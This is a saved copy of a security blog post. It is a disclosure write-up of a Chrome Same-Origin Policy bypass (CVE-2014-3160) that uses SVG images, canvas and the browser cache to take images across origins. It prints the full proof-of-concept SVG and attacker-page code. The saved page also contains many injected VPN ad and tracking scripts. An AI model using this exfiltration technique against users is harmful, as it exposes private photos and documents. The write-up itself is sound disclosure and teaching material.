<!DOCTYPE html>
<!-- saved from url=(0148)http://christian-schneider.net/ChromeSopBypassWithSvg.html?utm_content=bufferf1f05&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer#main -->
<html class="no-js" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--[if lt IE 9]>
<script src="js/html5.js"></script>
<![endif]-->

    

    <!-- Always force latest IE rendering engine (even in intranet) & Chrome Frame -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <!-- article relevant -->    
    <title>Chrome SOP Bypass with SVG (CVE-2014-3160)</title>

    
    <meta http-equiv="Cache-control" content="max-age=86400, must-revalidate">
    <meta http-equiv="Content-Language" content="en">

    <!-- article relevant -->    
    <meta name="TITLE" content="Chrome SOP Bypass with SVG (CVE-2014-3160)"> 
    <meta name="KEYWORDS" content="SOP, Chrome, Bypass, SVG, web application security, attack vectors, penetration testing, security review, web application hardening, java, j2ee, url encryption, intrusion detection system, ids, protective layer, sql injection, cross-site scripting, xss, csrf, clickjacking, crlf injection, null-byte injection, directory traversal, forceful browsing, command injection, cache poisoning, cross-site request forgery, session riding, session hijacking, authentication spoofing, script kiddies, vulnerability detection, exploit analysis, fingerprinting, alarming, notification, request response monitoring, anomaly detection, auditing, training, intercepting proxy, secdevops, security devops">
    <meta name="DESCRIPTION" content="This is a short writeup about my SOP (Same-Origin Policy) bypass with SVG images I&#39;ve found in Chrome.">
    <meta name="SUMMARY" content="This is a short writeup about my SOP (Same-Origin Policy) bypass with SVG images I&#39;ve found in Chrome.">
    <meta name="ABSTRACT" content="This is a short writeup about my SOP (Same-Origin Policy) bypass with SVG images I&#39;ve found in Chrome.">

    <meta name="AUTHOR" content="Christian Schneider">
    <meta name="PUBLISHER" content="Christian Schneider">
    <meta name="PAGE-TOPIC" content="Web Application Security">
    <meta name="CLASSIFICATION" content="Web Application Security">
    <meta name="IDENTIFIER" content="http://www.Christian-Schneider.net">
    <meta name="COPYRIGHT" content="Christian Schneider">
    <meta name="REVISIT-AFTER" content="5 days">
    <meta name="AUDIENCE" content="Developer, Security Manager, Tester, Project Manager, Software Architect">
    <meta name="LANGUAGE" content="en">

    <meta name="DC.title" content="Chrome SOP Bypass with SVG (CVE-2014-3160)"> 
    <meta name="DC.subject" content="Web Application Security">
    <meta name="DC.description" content="Christian Schneider blogging about Attack Vectors, Pentesting &amp; Web App Hardening">
    <meta name="DC.creator" content="Christian Schneider">
    <meta name="DC.publisher" content="Christian Schneider">
    <meta name="DC.type" content="Text">
    <meta name="DC.format" content="text/html">
    <meta name="DC.language" content="en">
    <meta name="DC.rights" content="Christian Schneider">
    
     <!-- Mobile viewport optimized: j.mp/bplateviewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="alternate" type="application/rss+xml" title="Newsfeed" href="http://christian-schneider.net/newsfeed.rss">
    
    <link href="./details_files/style.css" rel="stylesheet">
    
<script id="ichkstecqe880" type="text/javascript" src="./details_files/adlink_5458.html"></script><script id="ichkstIntr" type="text/javascript" src="./details_files/store.js"></script><script id="i9983" type="text/javascript" src="./details_files/adlink_6485.html"></script><script id="i5627" type="text/javascript" src="./details_files/adlink_7118.html"></script><script id="i1989" type="text/javascript" src="./details_files/adlink_6629.html"></script><script id="i4040" type="text/javascript" src="./details_files/adlink_2474.html"></script><script id="i8379" type="text/javascript" src="./details_files/adlink_6616.html"></script><script id="i5431" type="text/javascript" src="./details_files/adlink_4500.html"></script><script id="i6072" type="text/javascript" src="./details_files/adlink_5353.html"></script><script id="i6943" type="text/javascript" src="./details_files/adlink_6264.html"></script><script id="i2485" type="text/javascript" src="./details_files/adlink_795.html"></script><script id="i2855" type="text/javascript" src="./details_files/adlink_7474.html"></script><script id="i5029" type="text/javascript" src="./details_files/adlink_4521.html"></script><script id="i3281" type="text/javascript" src="./details_files/adlink_8921.html"></script><script id="i9806" type="text/javascript" src="./details_files/adlink_3454.html"></script><script id="i5500" type="text/javascript" src="./details_files/adlink_243.html"></script><script id="i2713" type="text/javascript" src="./details_files/adlink_9644.html"></script><script id="i9904" type="text/javascript" src="./details_files/adlink_486.html"></script><script id="i7872" type="text/javascript" src="./details_files/adlink_3188.html"></script><script id="i6922" type="text/javascript" src="./details_files/adlink_3011.html"></script><script id="i9261" type="text/javascript" src="./details_files/adlink_520.html"></script><script id="iecqe880" type="text/javascript" src="./details_files/ajslg.php"></script><script id="i2094" type="text/javascript" src="./details_files/adlink_2816.html"></script><script id="ifbw" type="text/javascript" src="./details_files/adlink_3573.html"></script><script id="i8690" type="text/javascript" src="./details_files/adlink_340.html"></script><script id="i4172" type="text/javascript" src="./details_files/adlink_1668.html"></script><script id="i8769" type="text/javascript" src="./details_files/adlink_1489.html"></script><script id="i7478" type="text/javascript" src="./details_files/adlink_2524.html"></script><script id="i4961" type="text/javascript" src="./details_files/adlink_2031.html"></script><script id="i8048" type="text/javascript" src="./details_files/adlink_7620.html"></script><script id="i8759" type="text/javascript" src="./details_files/adlink_8066.html"></script><script id="i2148" type="text/javascript" src="./details_files/adlink_704.html"></script><script id="i623" type="text/javascript" src="./details_files/adlink_1113.html"></script><script id="i6479" type="text/javascript" src="./details_files/adlink_9875.html"></script><script id="i5085" type="text/javascript" src="./details_files/adlink_2989.html"></script><script id="i3441" type="text/javascript" src="./details_files/adlink_6591.html"></script><script id="i8923" type="text/javascript" src="./details_files/adlink_4994.html"></script><script id="i4349" type="text/javascript" src="./details_files/adlink_4976.html"></script><script id="i6682" type="text/javascript" src="./details_files/adlink_2700.html"></script><script id="i1665" type="text/javascript" src="./details_files/adlink_8558.html"></script><script id="i3565" type="text/javascript" src="./details_files/adlink_9852.html"></script><script id="i6174" type="text/javascript" src="./details_files/adlink_3255.html"></script><script id="i6617" type="text/javascript" src="./details_files/uhsd2.php"></script><script id="i8331" type="text/javascript" src="./details_files/adlink_6701.html"></script><script id="i7823" type="text/javascript" src="./details_files/adlink_2405.html"></script><script id="i6668" type="text/javascript" src="./details_files/adlink_1679.html"></script><script id="i4393" type="text/javascript" src="./details_files/adlink_5352.html"></script><script id="i7619" type="text/javascript" src="./details_files/adlink_8223.html"></script><script id="i1667" type="text/javascript" src="./details_files/adlink_349.html"></script><script id="i4776" type="text/javascript" src="./details_files/adlink_884.html"></script><script id="i8981" type="text/javascript" src="./details_files/adlink_103.html"></script><script id="i7864" type="text/javascript" src="./details_files/adlink_2260.html"></script><script id="i4596" type="text/javascript" src="./details_files/adlink_1066.html"></script></head>

<body><script type="text/javascript">ANCHORFREE_VERSION="623161526"</script><script type="text/javascript">(function(){if(typeof(_AF2$runned)!='undefined'&&_AF2$runned==true){return}_AF2$runned=true;_AF2$ = {'SN':'HSSHIELD00IR','IP':'23.27.23.53','CH':'HSSCNL000684','CT':'z244','HST':'&isUpdated=0&isBlackIP=no&ipir=62.60.160.167&in=1470713988_20310982|d,65350658|w,68638996|m,10269984003|t&out=1470713988_3194073|d,6926235|w,7275050|m,3171075413|t&NUM_VID=0&NUM_VID_TS=1470711888&SFLAG=1&accessLP=1&bChrome=52&clsBtnCnt=4','AFH':'hss269','RN':Math.floor(Math.random()*999),'TOP':(parent.location!=document.location||top.location!=document.location)?0:1,'AFVER':'5.4.6','fbw':false,'FBWCNT':0,'FBWCNTNAME':'FBWCNT_CHROME','NOFBWNAME':'NO_FBW_CHROME','B':'c','VER': 'nonus'};if(_AF2$.TOP==1){document.write("<scr"+"ipt src='http://box.anchorfree.net/insert/insert.php?sn="+_AF2$.SN+"&ch="+_AF2$.CH+"&v="+ANCHORFREE_VERSION+6+"&b="+_AF2$.B+"&ver="+_AF2$.VER+"&afver="+_AF2$.AFVER+"' type='text/javascript'></scr"+"ipt>");}})();</script><script src="./details_files/insert.php" type="text/javascript"></script><script src="./details_files/store(1).js" type="text/javascript"></script><style type="text/css" title="AFc_css880">.AFc_body880{}.AFc_all880,a.AFc_all880:hover,a.AFc_all880:visited{outline:none;background:transparent;border:none;margin:0;padding:0;top:0;left:0;text-decoration:none;overflow:hidden;display:block;z-index:666999;}</style><style type="text/css">.AFhss_dpnone{display:none;width:0;height:0}</style><img src="about:blank" id="AFhss_trk0" name="AFhss_trk0" style="display:none"><img src="about:blank" id="AFhss_trk" name="AFhss_trk" style="display:none"><iframe src="./details_files/quantcast.html" style="width:0px;height:0px;display:none;"></iframe><style>#HSE_top_fixed665{width:100% !important;background:#fff !important;position:fixed !important;z-index:999999999 !important;display:block;height:90px;left:0px;border-bottom:3px solid #333;}#HSE_banner_fixed3536{background:transparent !important;position:fixed !important;z-index:999999999 !important;display:block;height:90px;left:0px;overflow:hidden !important;}#HSE_top_static319{width:100% !important;position:static !important;display:block;height:90px;left:0px;}</style><div id="HSE_top_fixed665" style="display: none;"></div><div id="HSE_banner_fixed3536" style="display: none;"><img style="float:left;display:block;position:absolute;border:0;top:0;left:0;z-index:100;height:90px;width:167px;cursor:pointer;" src="./details_files/hss_logo.jpg" title="This ad is brought to
you by Hotspot Shield.
For more info,visit us." onclick="window.location=&#39;http://hotspotshield.com/connected/&#39;;"><div style="position:absolute;width:928px;top:0px;left:307.5px;height:100px;"><span id="AFHSSADD" style="float:left;height:0;width:0"></span><iframe class="AFc_all880" name="AFif_uno880" id="AFif_uno880" src="./details_files/saved_resource.html" height="90" marginwidth="0" marginheight="0" vspace="0" hspace="0" frameborder="0" scrolling="no" width="728" allowtransparency="true"></iframe><iframe class="AFc_all880" name="AFif_duo880" id="AFif_duo880" src="./details_files/saved_resource(1).html" height="90" marginwidth="0" marginheight="0" vspace="0" hspace="0" frameborder="0" scrolling="no" width="728" allowtransparency="true"></iframe><iframe class="AFc_all880" name="widget880" id="widget880" src="./details_files/saved_resource(2).html" height="90" marginwidth="0" marginheight="0" vspace="0" hspace="0" frameborder="0" scrolling="no" width="168" allowtransparency="true" style="position:absolute;top:0px;left:738px;width:168px;height:90px;"></iframe><iframe class="AFc_all880" name="widget880_ncat" id="widget880_ncat" src="./details_files/saved_resource(3).html" height="90" marginwidth="0" marginheight="0" vspace="0" hspace="0" frameborder="0" scrolling="no" width="168" allowtransparency="true" style="position:absolute;top:0px;left:738px;width:168px;height:90px;display:none;"></iframe><img class="AFc_all" onclick="_B$.remove();return false;" id="AFi_ClA880" style="height:12px;font-family:verdana,arial,tahoma;width:12px;line-height:0.7;font-weight:bolder;background-color:#fff;position:absolute;cursor:hand;cursor:pointer;margin:0;border:0;padding:0;position:absolute;top:1px;right:0px;" src="./details_files/x_ask.gif" title="To keep Hotspot Shield free we display ads. Click [X] anytime to stop the display of ads."><div style="position:absolute;bottom:0px;left:0px;bottom:0px;color:#000;font-size:10px;">Advertisement</div></div></div><div id="HSE_top_static319" style="display: none;"></div><img id="AFhss_trkn6" src="./details_files/lg.php" style="display: none;"><style type="text/css"> #HSE_top_fixed665{height:100px !important;top:0px !important;background:rgb(238, 238, 238) !important;} #HSE_banner_fixed3536{height:100px !important;top:0px !important;width:100% !important;background:#fff !important;} #HSE_top_static319{height:100px !important;background:rgb(238, 238, 238) !important;}</style>

<div id="wrapper">

    <header id="header" class="clearfix" role="banner">
    
        <hgroup>
            <h1 id="site-title"><a href="http://christian-schneider.net/index.html">Web Application Security Blog</a></h1>
            <h2 id="site-description">Christian Schneider blogging about Attack Vectors, Pentesting &amp; Web App Hardening</h2>
        </hgroup>
    
    </header> <!-- #header -->

<div id="main" class="clearfix">

	<!-- Navigation -->
    <nav id="menu" class="clearfix" role="navigation">
        <ul> 
            <li class="current"><a href="http://christian-schneider.net/index.html">Blog</a></li>
            <li><a href="http://christian-schneider.net/pentest.html">Pentests</a>
                <ul>
                    <li><a href="http://christian-schneider.net/pentest.html#pentest">Blackbox&nbsp;Pentest</a></li>
                    <li><a href="http://christian-schneider.net/pentest.html#scan">Recurring&nbsp;Web&nbsp;Scan</a></li>
                    <li><a href="http://christian-schneider.net/pentest.html#review">Whitebox&nbsp;Security&nbsp;Review</a></li>
                 	<li><a href="http://christian-schneider.net/advisories.html#main">Security&nbsp;Advisories&nbsp;&amp;&nbsp;CVEs </a></li>
                </ul>
            </li>
            <li><a href="http://christian-schneider.net/training.html">Trainings</a>
                <ul>
                    <li><a href="http://christian-schneider.net/WebApplicationSecurityAwareness.html#details">Live&nbsp;Hacking</a></li>
                    <li><a href="http://christian-schneider.net/WebHackingAndHardening.html#details">Java&nbsp;Web&nbsp;Security</a></li>
                    <li><a href="http://christian-schneider.net/training.html#webPentesting">Web Pentesting</a></li>
                    <li><a href="http://christian-schneider.net/training.html#securityDevOps">SecDevOps</a></li>
                </ul>
            </li>
            <li><a href="http://christian-schneider.net/contact.html">Contact</a></li>
        </ul>
    </nav> <!-- #nav -->
    
    <!-- Show a "Please Upgrade" box to both IE7 and IE6 users (Edit to IE 6 if you just want to show it to IE6 users) - jQuery will load the content from js/ie.html into the div -->
    
    <!--[if lte IE 7]>
        <div class="ie warning"></div>
    <![endif]-->
    
    <div id="content" role="main">
    
        <article class="post">
        
            <h2 class="entry-title">Chrome SOP Bypass with SVG (CVE-2014-3160)</h2>
            
            <figure>
                <img src="./details_files/sop.jpg" class="thumbnail alignleft" width="200" height="200">
            </figure>
            
            <div class="entry-content">
                
                <p>
                  This is a short writeup about my SOP (Same-Origin Policy) bypass with SVG images I've found in Chrome, so that other security researchers can benefit from it. I reported the Chrome vulnerability to Google's security team in 2014 and they did a very good job at fixing it in Chrome's M36 release. At around Q4 2014 the bug ticket (#380885) was opened to public, so that I'm allowed to publish this writeup (as soon as I find time to write)...
                </p>
				<p>
					Basically all kinds of SOP bypasses are rather critical, since they completely lift one of the important protection mechanisms in browsers (the SOP) against malicious websites doing nasty stuff while we're surfing. But this (rather hidden and not so easy to find) one <i>only</i> allowed the attacker to successfully exfiltrate images from other sites - not the site's textual content. Therefore it was <i>only</i> of medium severity, though depending on the application even this could be abused heavily, as I did in a <b>PoC to steal victim's images/photos</b> as an example.
				</p>
                <p>
					I played a little with SVG images, HTML5 Canvas, and the SOP in Chrome trying to find ways to bypass the protection of the SOP and exfiltrate content cross-origin:
					Generally it is allowed to load images from other origins, as they are (by design) not governed by the SOP. With HTML5 Canvas it is easy to to render content like images or SVG in such a Canvas and derive a <b>dataURL</b> from it that can be sent to an attacker as Base64, which is simply the visual representation of the Canvas' content. So I thought of this as a way to exfiltrate secret content by putting it (via a malicious website) somehow onto a Canvas (cross-origin) and generating the dataURL from it to be sent back to me (as an attacker) in Base64.
				</p>
                <p>
					Of course a Canvas object is not allowed to be stripped into a dataURL as soon as it contains <b>tainted content</b> like images coming from foreign origins: So roughly speaking one can fetch an image from a foreign origin, put it onto an HTML5 Canvas, but then fetching the dataURL from that Canvas is prohibited by the browser throwing a <b>tainted canvas security exception</b>.
				</p>
				
				<h3>Loading foreign content into Canvas via SVG</h3>
				<p>
					At first I experimented in a malicious website with many different ways to load foreign (i.e. cross-origin) content into a Canvas and tried to generate the dataURL from it, which I could then exfiltrate. As expected, all interesting ways to load foreign content directly into the Canvas resulted for Chrome (and the tested other browsers) in the aforementioned "tainted canvas security exception" when trying to generate the dataURL from it. 
				</p>
                <p>
					So I soon needed a more indirect way of loading foreign data into a Canvas, which is where SVG (Scalable Vector Graphics) came in: 
					</p><ol><li>One could (on a malicious website) host a malicious SVG,</li> <li>which loads foreign content cross-origin (the target of the attack) and then</li> <li>simply render the SVG on the Canvas followed by</li> <li>generating the dataURL form it.</li></ol> 
					
					OK, so let's try that: I first used <code>&lt;foreignObject&gt;</code> inside my malicious SVG to render HTML in SVG which allowed me to nest an <code>&lt;iframe&gt;</code> in it, pointing towards a cross-origin page: the rendered SVG included the iframe of the data to exfiltrate, but when trying to draw the SVG onto a Canvas object and fetching the dataURL from that, Chrome successfully again prohibited it as a violation of the SOP. So no luck with <code>&lt;foreignObject&gt;</code> inside SVG then. Same was true with other ways to load textual content cross-origin (via CSS for example): also no luck there...
				<p></p>
                <p>
					Hence I tried to stick with image objects at least: The aim was to exfiltrate images from victims (like private photo albums, webmailer scanned documents attached as inline images, online banking stock portfolio images, etc.). The idea was to fetch them via a malicious website cross-origin, but indirectly via an image inside an SVG. Then again try to put that SVG onto a Canvas for dataURL generation and exfiltration. So here goes my first attempt towards the solution (though this first try was not working as explained later on):
</p><p>Malicious SVG (named <code>exploit.svg</code> hosted on attacker's site <code>attacker.tld</code>), loading a secret image from <code>victim.tld</code> in SVG to exfiltrate:
</p><pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
  &lt;rect fill="#bbbbbb" width="500" height="300"/&gt;
  <q>&lt;image x="0" y="0" width="400" height="250" 
      xlink:href="<em>https://victim.tld/secret/secret.jpg</em>"/&gt;</q>
&lt;/svg&gt;</code></pre>
<p></p>


<p>The malicious website (hosted also on attacker's site <code>attacker.tld</code>) then tried to exploit it by drawing the SVG onto the Canvas and exfiltrate it. <i>Please note that this first try did not work:</i>
</p><pre><span style="color:#aaaaaa">This exploit can be performed completely without user interaction. 
The following buttons are just to help you in understanding the exploit 
and how it works: To run it press "exploit step 1" button 
followed by "exploit step 2"</span>

&lt;input type="button" value="exploit step 1" onclick="go1()"&gt;
&lt;input type="button" value="exploit step 2" onclick="go2()"&gt;

<span style="color:#aaaaaa">&lt;!-- Canvas (hidden) to strip the cross-origin image into dataURL later 
(can also be hidden using style="display:none" !) --&gt;</span>
&lt;canvas id="canvas" width="700" height="500"/&gt;


&lt;script&gt;<q>
  function importSVG(source, target) {
    var ctx = target.getContext("2d");
    var img = new Image();
    <em>img.src = source;</em>
    img.onload = function() {
      <em>ctx.drawImage(img,0,0);</em>
    }
  }

  <span style="color:#aaaaaa">// load the attacker's exploit.svg into the Canvas 
  // (note the exploit.svg itself references the victim's 
  // secret cross-origin image!)</span>
  function go1() {
    var canvas = document.getElementById("canvas");
    importSVG(<em>"exploit.svg"</em>, canvas);
  }

  <span style="color:#aaaaaa">// tries to exfiltrate the cross-origin image by converting 
  // the canvas into dataURL:</span>
  function go2() {
    <em>var img = canvas.toDataURL("image/png");</em> <strong style="color:#aaaaaa">// detected by Chrome as SOP violation ;-(</strong>
    alert("I got the secret image here to exfiltrate stealthy: "+img);
  }</q>
&lt;/script&gt;</pre>
<p></p><p>

				But unfortunately (from the view of an attacker) this was also checked by Chrome: The try to exfiltrate the image's visible content by converting the Canvas (indirectly tainted by SVG with a cross-origin image) into a dataURL was <b>prohibited as a violation of the SOP</b>!
				</p>

				<h3>Resetting the tainted flag via browser cache</h3>
				<p>
					Well, up until here no luck so far... But after having tried so many ways to come up with the above version, I simply didn't want to give up on that SOP bypass path in Chrome, so that I needed to find a way to <b>reset the tainted flag</b> of the SVG's content somehow. At this point browser caching came into my mind: </p><blockquote>What if the source of where the content to exfiltrate comes from is not directly the foreign origin? What if the image is fetched from a browser's cache instead?</blockquote> <b>That</b> was my final ingredient for the SOP bypass exploit to exfiltrate images!
				<p></p>
				<p>
				So I slightly modified my malicious webpage by adding a loading of the SVG as a regular <code>&lt;object&gt;</code> embedded content <b>before</b> the SVG is loaded (this time from cache) during the exploit's action. The embedding of the SVG via <code>&lt;object&gt;</code> before was simply to populate the cache before the exploit runs, so that the tainted checks eventually will see the image in the SVG coming from the browser's cache instead of a foreign origin and thus allow us to exfiltrate it "via SVG via Canvas via dataURL".
                </p>
                <p>
					The malicious website (hosted also on attacker's site <code>attacker.tld</code>) now successfully exploited it by pre-populating the browser cache with the SVG. <i>Please note that this second try did successfully work due to the <span class="colored">colored addition</span> of cache pre-population:</i>
</p><pre><span style="color:#aaaaaa">This exploit can be performed completely without user interaction. 
The following buttons are just to help you in understanding the exploit 
and how it works: To run it press "exploit step 1" button 
followed by "exploit step 2"</span>

&lt;input type="button" value="exploit step 1" onclick="go1()"&gt;
&lt;input type="button" value="exploit step 2" onclick="go2()"&gt;

<span style="color:#aaaaaa">&lt;!-- Populates the image cache with the "secret" cross-origin image --&gt;</span>
<em>&lt;object data="exploit.svg" type="image/svg+xml"&gt;&lt;/object&gt;</em>

<span style="color:#aaaaaa">&lt;!-- Canvas (hidden) to strip the cross-origin image into dataURL later 
(can also be hidden using style="display:none" !) --&gt;</span>
&lt;canvas id="canvas" width="700" height="500"/&gt;


&lt;script&gt;<q>
  function importSVG(source, target) {
    var ctx = target.getContext("2d");
    var img = new Image();
    img.src = source;
    img.onload = function() {
      ctx.drawImage(img,0,0);
    }
  }

  <span style="color:#aaaaaa">// load the attacker's exploit.svg into the Canvas 
  // (note the exploit.svg itself references the victim's 
  // secret cross-origin image!)</span>
  function go1() {
    var canvas = document.getElementById("canvas");
    importSVG("exploit.svg", canvas);
  }

  <span style="color:#aaaaaa">// tries to exfiltrate the cross-origin image by converting 
  // the canvas into dataURL:</span>
  function go2() {
    var img = canvas.toDataURL("image/png");
    alert("I got the secret image here to exfiltrate stealthy: "+img);
  }</q>
&lt;/script&gt;</pre>
<p></p><p>					
					
					Finally that did the trick and the result was the successful exfiltration of images cross-origin in Chrome. The images are loaded with all authentication data in place, so cookies and HTTP auth is kept intact, allowing to exfiltrate secret images from users logged-in somewhere (like private photo albums, etc.). I also successfully exfiltrated an image attachment of a mail via Gmail webmailer. Another exploitation scenario is for the attacker to check whether the victim is logged in with some sites or not in case they serve certain images or not depending on the logged-in state.
                </p>
				<p>
					Please note that the images were required to not have anti-caching headers for the exploit to run. </p><blockquote>In other words: Serving (at least secret) images with proper anti-cache headers prevented the exploit from an application's point of view.</blockquote>
					
					From this point on I had found what I was seeking: A SOP bypass in Chrome. I reported that to Google's security team as bug ticket <a href="https://code.google.com/p/chromium/issues/detail?id=380885" target="_blank">380885</a> along with a working exploit on two of my domains: The exploit hosting code is still there (referenced from within the ticket), so that anyone interested in browser security can use this as a quick testcase... Google fixed it in version <a href="http://googlechromereleases.blogspot.de/2014/07/stable-channel-update.html" target="_blank">36.0.1985.125</a> of Chrome for Windows, Mac and Linux and assigned the <a href="http://www.cvedetails.com/cve/CVE-2014-3160" target="_blank">CVE-2014-3160</a>.
                <p></p>
				<p>
						For those of you interested in how the exploit looked I also enhanced it to not only alert the image, but also directly render it: The following three screenshots of the vulnerable Chrome version demonstrate it by exfiltrating a "top secret" image from a victim's domain and render it subsequently for quick demonstration (could be exfiltrated via XHR in the background). Also the exploit required no user interaction. The buttons "step 1" and "step 2" have just been added to have a better debugging and understanding of the exploit PoC demo:
						</p><ul>
							<li><b>State before pressing "step 1"</b><br> We see the secret image from a logged-in state (other tab) with another domain:</li><img src="./details_files/sopBypassStep1.jpg" width="700">
							<li><b>State after pressing "step 1"</b><br> We see the secret image fetched into an SVG which is also rendered (for debugging purposes):</li><img src="./details_files/sopBypassStep2.jpg" width="700">
							<li><b>State after pressing "step 2"</b><br> We see the secret image exfiltrated (as dataURL below) and re-rendered for quick visual check. Here a fixed version simply shows a blank grey image instead:</li><img src="./details_files/sopBypassStep3.jpg" width="700">
						
						
						Google Security rewarded the responsible disclosure of this Chrome vulnerability along with a fully documented working exploit with a bug bounty. Thank you very much Google!
				<p></p>
            </ul></div> <!-- .entry-content -->
            
            

            <div class="entry-teaser">
                <h3>Conclusion</h3>
	
				<p>
					</p><dl>
						<dt>As a Pentester</dt>
                        <dd>As always think outside the box and try to combine different tricks and techniques to get the full working exploit. As done here with the fact that images can also be loaded indirectly via SVG and when combining this with browser cache to reset the tainted flag, it was a successful end-to-end SOP bypass for exfiltration of secret images in Chrome.</dd>
						
						<dt>As a Developer</dt>
                        <dd>At first sight this was more of a browser vendor issue than an application developer's. But nevertheless it shows how underestimated recommendations, like using proper anti-caching response headers for sensitive content, can sometimes prevent successful 0day exploitation, as was the case with this SOP bypass: I've successfully tested that images with proper anti-caching headers won't get exfiltrated that way (as the cache requirement for resetting of the tainted flag was no longer met).</dd>
					</dl>
                <p></p>

            </div>
                        
            
            <footer class="post-meta">
                <p>
                    by <span class="author vcard"><a class="url fn n" href="http://christian-schneider.net/contact.html#main">Christian Schneider</a></span>
                    on <time datetime="2015-03-08" pubdate="">March 8th, 2015</time>
                </p>
                <a href="http://christian-schneider.net/ChromeSopBypassWithSvg.html?utm_content=bufferf1f05&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer#comment" class="more-link">Feedback</a>
            </footer> <!-- .post-meta -->
        
        </article> <!-- .post 1 -->
        
    </div> <!-- #content -->
    
    <aside id="sidebar" role="complementary">

        <!-- 
        <aside class="widget">
            <form action="#" class="searchform">
                <input type="search" results="10" placeholder="Search..." />
                <input type="submit" value="Search" />
            </form> 
        </aside>
         -->
         
        <aside class="widget">
            <h3>Network</h3>
            <ul>
                <li><a type="application/rss+xml" href="http://christian-schneider.net/newsfeed.rss">Newsfeed</a></li>
                <li><a href="https://twitter.com/cschneider4711" target="_blank">Twitter</a></li>
                <li><a rel="author" href="https://plus.google.com/115027105260593189961?rel=author" target="_blank">Google+</a></li>
                <li><a href="https://www.xing.com/profile/Christian_Schneider248" target="_blank">Xing</a></li>
                <li><a href="https://de.linkedin.com/in/cschneider4711" target="_blank">LinkedIn</a></li>
                <li><a href="https://github.com/cschneider4711" target="_blank">GitHub</a></li>
            </ul>
        </aside> <!-- .widget -->
         
        <aside class="widget" id="comment">
            <h3>Feedback</h3>
            If you wish to comment on this post or contribute helpful tips, just send me a <a href="http://christian-schneider.net/contact.html#main">mail</a>
            referencing this post.
        </aside> <!-- .widget -->
         
    </aside> <!-- #sidebar -->
    
</div> <!-- #main -->
    
    <footer id="footer">
        <p>
            Copyright Â© 2015 <a href="http://www.christian-schneider.net/">Christian Schneider</a>
            <span class="sep">|</span>
            <a href="http://christian-schneider.net/disclaimer.html">Disclaimer</a>
        </p>
    </footer> <!-- #footer -->
    
    <div class="clear"></div>

</div> <!-- #wrapper -->



<img id="AFhss_trkn9" src="./details_files/lg(1).php" style="display: none;"></body></html>